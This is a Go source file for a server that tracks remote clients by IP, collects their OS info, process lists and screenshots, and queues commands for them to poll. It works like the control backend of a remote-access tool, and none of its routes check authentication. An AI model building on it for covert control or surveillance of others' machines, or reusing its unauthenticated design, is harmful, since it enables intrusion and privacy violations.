package main

import (
	"fmt"
	"io"
	"log"
	"sync"
	"net/http"
	"strconv"
	"x_server/types"
	"x_server/utils"
	"github.com/gin-gonic/gin"
	"gorm.io/gorm"
)


type GenericAnswer struct 
{
	Message string	`json:"message"`
}

type PlainId struct
{
	ID any
}

const port =	10013


type ProcessesContainer struct
{
	mu sync.Mutex
	ProcessesMap map[string]*[]types.Process
}

func (q * ProcessesContainer)SetProcesses(addr * string, processes * []types.Process) {
	q.ProcessesMap[*addr] = processes
}

func (q * ProcessesContainer)GetProcesses(addr * string) *[]types.Process {

	data, ok := q.ProcessesMap[*addr]

	if (!ok) {
		return nil
	}

	return data
}

func (q * ProcessesContainer)GetProcessCount(addr * string) int {
	data, ok := q.ProcessesMap[*addr]

	if (!ok) {
		return 0
	}

	return len(*data)
}

var ClientsProcesses = ProcessesContainer{ProcessesMap: make(map[string]*[]types.Process)}

var ClientsOSInfos	 	sync.Map
var ClientsScreenShots 	sync.Map


var ClientInfoAboutCommands *int = nil

var db_conn * gorm.DB = nil

func GetClientIPAddress(c * gin.Context) string {
	return c.ClientIP()
}

func ReadRequestDataAsType(obj any, in * io.ReadCloser)  {

	var outStr string
	utils.GetRequestBodyAsString(in, &outStr)
	utils.FromJson(obj, &outStr)
}

func AddClient(c * gin.Context) {

	client := types.Client{}
	ReadRequestDataAsType(&client, &c.Request.Body)

	var id int
	value, status := utils.AddClientDB(db_conn, &client, &id, GetClientIPAddress(c));

	if (status == utils.CLIENT_ADD_FAILURE) {
		c.String(http.StatusInternalServerError, "client add error")
		return
	}

	c.JSON(http.StatusOK, value)
}



func UpdateClientOsInfo(c * gin.Context) {

	os_info := types.OSInfo{}
	ReadRequestDataAsType(&os_info, &c.Request.Body)
	
	addr := GetClientIPAddress(c)

	if (utils.FindClientByIpAddrDB(db_conn, addr) == nil) {
		c.String(http.StatusNotFound, "404, no such client")
		return
	}
	
	ClientsOSInfos.Store(addr, &os_info)

	c.String(http.StatusOK, "operating system info updated")
}

func GetClientOSInfo(c * gin.Context) {

	addr := GetClientIPAddress(c)

	if (utils.FindClientByIpAddrDB(db_conn, addr) == nil) {
		c.JSON(http.StatusNotFound, nil)
		return
	}

	value, ok := ClientsOSInfos.Load(addr)

	if (!ok) {
		c.JSON(http.StatusNotFound, nil)
	} else {
		c.JSON(http.StatusOK, value)
	}

}


func UpdateClientProcessesById(c * gin.Context) {

	ip := GetClientIPAddress(c)

	if (utils.FindClientByIpAddrDB(db_conn, ip) == nil) {
		c.String(http.StatusNotFound, "404, no such host")
		return
	}
	
	var processes []types.Process
	ReadRequestDataAsType(&processes, &c.Request.Body)

	ClientsProcesses.mu.Lock()

	ClientsProcesses.SetProcesses(&ip, &processes)
	
	ClientsProcesses.mu.Unlock()

	c.String(http.StatusOK, "processes updated")
}

func GetProcesses(c * gin.Context) {

	addr := GetClientIPAddress(c)

	if (utils.FindClientByIpAddrDB(db_conn, addr) == nil) {
		c.JSON(http.StatusNotFound, nil)
		return
	}

	ClientsProcesses.mu.Lock()

	processes, ok := ClientsProcesses.ProcessesMap[addr]
	if (ok) {
		c.JSON(http.StatusOK, processes)
	} else {
		c.JSON(http.StatusNotFound, nil)
	}

	ClientsProcesses.mu.Unlock()
}

// sends command to client

func PollCommand(c * gin.Context) {

	ip := GetClientIPAddress(c)

	client := utils.FindClientByIpAddrDB(db_conn, ip)
	
	if (client == nil) {
		c.String(http.StatusNotFound, "404, client is not registered, register is done by it own")
		return
	}

	cmd_type, _ := strconv.Atoi(c.Param("cmd_type"))

	cmd, stat := utils.GetCommandByClientAddr(ip, cmd_type)

	if (stat == utils.ERR_NO_ERR) {

		c.JSON(http.StatusOK, cmd)
		return;
	}

	c.String(http.StatusNotFound, "404, no such command, or list for you is unregistered :)")
}


func AddCommand(c * gin.Context) {

	cmd_type, _ := strconv.Atoi(c.Param("cmd_type"))
	client_addr := c.Param("client_addr")

	if (utils.FindClientByIpAddrDB(db_conn, client_addr) == nil) {
		c.String(http.StatusNotFound, "404, no such client")
		return
	}

	if (!types.IsWellKnown(cmd_type)) {
		c.String(http.StatusNotFound, "404, no such command exist")
		return
	}

	if (!utils.IsStorageForClientExists(&client_addr)) {
		utils.CreateNewCommandStorage(client_addr)
	
	} else if (utils.IsSuchCommandAlreadyInCommandList(&client_addr, cmd_type)) {
		c.String(http.StatusNotModified, "")
		return
	}

	cmd := types.CreateNewReady(cmd_type)

	utils.PushNewCommandToStorage(cmd, client_addr)

	c.String(http.StatusNoContent, "")
}

func UpdateCommand(c * gin.Context) {

	ip := GetClientIPAddress(c)

	client := utils.FindClientByIpAddrDB(db_conn, ip)

	if (client == nil) {

		c.String(http.StatusNotFound, "404, client is not registered")
		return
	}

	cmd_type, _ := strconv.Atoi(c.Param("cmd_type"))

	cmd_state_new := types.Command{}

	ReadRequestDataAsType(&cmd_state_new, &c.Request.Body)

	if (!utils.IsSuchCommandAlreadyInCommandList(&ip, cmd_type)) {
		c.String(http.StatusNotFound, "404, command not found for client")
		return
	}


	if (utils.UpdateCommandByClientAddr(&ip, cmd_type, &cmd_state_new)) {
		c.String(http.StatusOK, "command updated")
	} else {
		c.String(http.StatusInternalServerError, "command wasn't updated")
	}
}

func RemoveCommand(c * gin.Context) {

	cmd_type, _ 	:= strconv.Atoi(c.Param("cmd_type"))
	addr 		:= 	c.Param("client_addr")

	if (utils.FindClientByIpAddrDB(db_conn, addr) == nil) {
		c.String(http.StatusNotFound, "404, client not found on the server")
		return;
	}

	if (utils.DeleteCommandByClientAddr(&addr, cmd_type) != -1) {
		c.String(http.StatusNoContent, "command deleted")
	} else {
		c.String(http.StatusNotFound, "command wasn't deleted")
	}

}

func PollCommandStatus(c * gin.Context) {

	cmd_type, _ := strconv.Atoi(c.Param("cmd_type"))
	client_addr := c.Param("client_addr")

	if (utils.FindClientByIpAddrDB(db_conn, client_addr) == nil) {
		c.JSON(http.StatusNotFound, nil)
		return
	}

	cmd, stat := utils.GetCommandByClientAddr(client_addr, cmd_type)

	if (stat == utils.ERR_NO_CONTAINER_SET || stat == utils.ERR_NO_SUCH_COMMAND) {
		c.JSON(http.StatusNotFound, nil)
		return
	}

	if (cmd.Status == types.CMD_STATUS_SYSTEM_ERROR) {
		c.JSON(http.StatusInternalServerError, nil)
	} else if (cmd.Status == types.CMD_STATUS_SUCCESS) {
		c.JSON(http.StatusNoContent, nil)
	} else {
		c.JSON(http.StatusNotModified, nil)
	}

}

func PollClients(c * gin.Context) {

	clients, err := utils.GetAllRegisteredClients(db_conn)

	if (err != nil) {
		c.JSON(http.StatusInternalServerError, nil)
		return
	}

	c.JSON(http.StatusOK, clients)

}

func CheckAboutCommandFailure(c * gin.Context) {

	ip := GetClientIPAddress(c)
	cmd_type, _ := strconv.Atoi(c.Param("cmd_type"))
	if (utils.FindClientByIpAddrDB(db_conn, ip) == nil) {
		c.String(http.StatusNotFound, "")
		return
	}

	cmd, err := utils.GetCommandByClientAddr(ip, cmd_type)

	if (err != utils.ERR_NO_ERR) {
		c.String(http.StatusNotFound, "")
		return;
	}

	if (cmd.Status == types.CMD_STATUS_SYSTEM_ERROR) {
		c.String(http.StatusOK, "")
	} else {
		c.Status(http.StatusNotModified)
	}

}

func KeepAliveClient(c * gin.Context) {

	// updates client

	addr := GetClientIPAddress(c)

	if (utils.FindClientByIpAddrDB(db_conn,addr) == nil) {
		c.String(http.StatusNotFound, "")
		return
	}

	client := types.Client{}
	ReadRequestDataAsType(&client, &c.Request.Body)

	if (utils.UpdateClientDB(db_conn, &client)) {
		c.String(http.StatusNoContent, "client updated")
	} else {
		c.String(http.StatusInternalServerError, "client not updated")
	}

}

func DisconnectClient(c * gin.Context) {

	// sets client's online status to false
	// sets os info running time of client to -1
	// removes all resources from maps etc. (frees memory)

	addr := GetClientIPAddress(c)

	if (utils.FindClientByIpAddrDB(db_conn, addr) == nil) {
		c.String(http.StatusNotFound, "")
		return
	}

	utils.RemoveAllClientCommands(&addr)
	utils.RemoveClientContainer(&addr)

	delete(ClientsProcesses.ProcessesMap, addr)
	ClientsOSInfos.Delete(addr)
}

func PostClientScreenshot(c * gin.Context) {

	addr := GetClientIPAddress(c)
	bytes, err := io.ReadAll(c.Request.Body)

	if (err != nil) {
		c.String(http.StatusInternalServerError, "");
	} else {
		
		ClientsScreenShots.Store(addr, &bytes)
		fmt.Printf("screen-shot size: %d\n", len(bytes))
	}

}

func FetchClientLastScreen(c * gin.Context) {

	addr := c.Param("client_addr")

	if (utils.FindClientByIpAddrDB(db_conn, addr) == nil) {
		c.String(http.StatusNotFound, "")
		return
	}

	value, ok := ClientsScreenShots.Load(addr)

	if (!ok) {
		c.String(http.StatusNotFound, "")
	} else {

		c.Header("Content-Type", "image/bmp")

		real_data := value.(*[]byte)
		c.Writer.Write(*real_data)

		ClientsScreenShots.Delete(addr)

	}

}

func main() {

	db_conn = utils.GetNewDbClient()
	if (db_conn == nil) {
		log.Fatalf("Connection to database server was failed, and that was fatal ...");
	}

	utils.MakeMigrations(db_conn)

	

	router := gin.Default()
	
	
	router.GET("/clients", PollClients)
	router.POST("/register_client", AddClient);
	router.POST("/update_computer/:client_id", UpdateClientOsInfo);
	router.POST("/update_processes/:client_id", UpdateClientProcessesById)
	
	router.GET("/poll_about_command/:cmd_type", PollCommand)
	router.POST("/update_command/:cmd_type", UpdateCommand)

	router.GET("/poll_status/:cmd_type/:client_addr", PollCommandStatus)
	router.POST("/add_command/:cmd_type/:client_addr", AddCommand)
	router.DELETE("/remove_command/:cmd_type/:client_addr", RemoveCommand)
	router.GET("/get_processes/:client_addr", GetProcesses)
	router.GET("/get_osinfo/:client_addr", GetClientOSInfo)

	router.HEAD("/check_failure/:cmd_type", CheckAboutCommandFailure)
	router.POST("/keep_alive", KeepAliveClient)
	router.POST("/disconnect", DisconnectClient)
	router.POST("/post_screen", PostClientScreenshot)
	router.GET("/get_and_remove_screen/:client_addr", FetchClientLastScreen)

	log.Println("Server started!")
	router.Run(fmt.Sprintf(":%d", port));
}